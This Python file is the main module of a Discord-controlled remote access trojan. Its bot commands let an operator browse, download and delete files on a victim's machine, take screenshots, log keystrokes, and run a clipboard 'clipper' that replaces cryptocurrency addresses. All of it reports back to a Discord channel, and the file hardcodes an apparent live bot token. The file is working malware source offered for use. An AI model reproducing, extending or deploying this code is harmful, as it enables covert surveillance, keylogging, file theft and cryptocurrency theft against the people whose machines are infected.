import discord
import sys
import asyncio
from discord.ext import commands
from functions.help import setup_help_command

clipper_active = False
input_monitor_active = False

CHANNEL_ID = 1293132121547735147
DISCORD_TOKEN = "MTI3ODY1MjQ3NDM3MDAzMTYxNw.GoFFed.BTt1HxcZHUKO4iOSEPf_dSosQXrUO5fJsRriSE"
SERVER_ID = 1293132121547735144

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def lazy_load_toggleable_module(module_name, submodule_name=None):
    if submodule_name:
        module = __import__(f"{module_name}.{submodule_name}", fromlist=[submodule_name])
    else:
        module = __import__(module_name)
    return module

def unload_toggleable_module(module_name):
    if module_name in sys.modules:
        del sys.modules[module_name]

def lazy_load_module(module_name, submodule_name=None):
    if submodule_name:
        module = __import__(f"{module_name}.{submodule_name}", fromlist=[submodule_name])
    else:
        module = __import__(module_name)
    return module

def unload_module(module_name):
    if module_name in sys.modules:
        del sys.modules[module_name]

@bot.event
async def on_ready():
    activity = discord.Activity(type=discord.ActivityType.watching, name="your every move 👁️")
    await bot.change_presence(status=discord.Status.online, activity=activity)

@bot.command(name="browse", help="Shows all directories and files in a path.")
async def browse(ctx, *, path: str = None):
    category = "file_browser"
    from functions.file_browser import list_directory_contents, handle_navigation
    if path:
        await handle_navigation(bot, CHANNEL_ID, path)
    else:
        await list_directory_contents(bot, CHANNEL_ID)

@bot.command(name="clipper", help="Monitor clipboard contents, and replace crypto addresses.")
async def clipper(ctx):
    category = "clipper"
    global clipper_active
    try:
        clipper_module = lazy_load_toggleable_module('functions', 'clipper')
        await clipper_module.toggle_clipper(bot, CHANNEL_ID, clipper_active)
        clipper_active = not clipper_active
        if not clipper_active:
            unload_toggleable_module('functions.clipper')
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name="crypto", help="Manage crypto addresses for the clipper.")
async def crypto(ctx, action: str, *, address: str = None):
    category = "clipper"
    clipper_module = lazy_load_toggleable_module('functions', 'clipper')
    if action == "set" and address:
        await clipper_module.set_crypto_address(bot, ctx, address, clipper_active)
    elif action == "list":
        await clipper_module.list_crypto_addresses(bot, ctx, clipper_active)
    else:
        await ctx.send("**Usage:** `!crypto set <address>`, `!crypto list`")

@bot.command(name="delete", help="Deletes a file in a specified path.")
async def delete(ctx, *, file_path: str):
    category = "delete"
    from functions.delete import delete_file
    file_path = file_path.replace("\\", "/")
    result_message = delete_file(file_path)
    await ctx.send(result_message)

@bot.command(name="download", help="Downloads a file in a specified path.")
async def download(ctx, *, file_path: str):
    category = "download"
    from functions.download import download_and_send
    file_path = file_path.replace("\\", "/")
    await download_and_send(bot, CHANNEL_ID, file_path)

@bot.command(name="drives", help="Lists the available drives on the system.")
async def drives(ctx):
    category = "file_browser"
    from functions.file_browser import list_directory_contents
    await list_directory_contents(bot, CHANNEL_ID)

@bot.command(name="inputs", help="Monitors keyboard inputs and sends them in randomized batches.")
async def inputs(ctx):
    category = "input_monitor"
    global input_monitor_active
    try:
        input_monitor_module = lazy_load_toggleable_module('functions', 'input_monitor')
        await input_monitor_module.toggle_input_monitor(bot, CHANNEL_ID, input_monitor_active)
        input_monitor_active = not input_monitor_active
        if not input_monitor_active:
            unload_toggleable_module('functions.input_monitor')
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name="installation", help="Shows installation details and installed functions.")
async def installation(ctx):
    installation_module = lazy_load_module("functions.installation")
    await installation_module.installation(ctx, bot)
    unload_module("functions.installation")


@bot.command(name="screenshot", help="Takes a screenshot of the user's screen(s).")
async def screenshot(ctx):
    category = "screenshot"
    screenshot_module = lazy_load_module('functions', 'screenshot')
    await screenshot_module.capture_and_send(bot, CHANNEL_ID)
    unload_module('functions.screenshot')

@bot.command(name="update", help="Updates specified functions from the GitHub Repo on next run.")
async def update(ctx, *, files: str = None):
    category = "update"
    from functions.update import update_command
    await update_command(ctx, files=files)

@bot.command(name="usage", help="Displays system usage information and uptime.")
async def usage(ctx):
    category = "system_usage"
    system_usage = lazy_load_module('functions', 'system_usage')
    await system_usage.monitor_system(bot, CHANNEL_ID)
    unload_module('functions.system_usage')

@bot.command(name="window", help="Lists the information of the window currently focused.")
async def get_focused_window(ctx):
    category = "window"
    from functions.window import get_focused_window_message
    message = get_focused_window_message()
    await ctx.send(message)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"**Error:** The command `{ctx.message.content}` was not found. Please use `!help` to see the list of available commands.")
    else:
        await ctx.send(f"**Error:** `{str(error)}`")

def start_discord_bot():
    global bot_event_loop
    bot_event_loop = asyncio.get_event_loop()
    bot.run(DISCORD_TOKEN)

setup_help_command(bot)

bot.run(DISCORD_TOKEN)
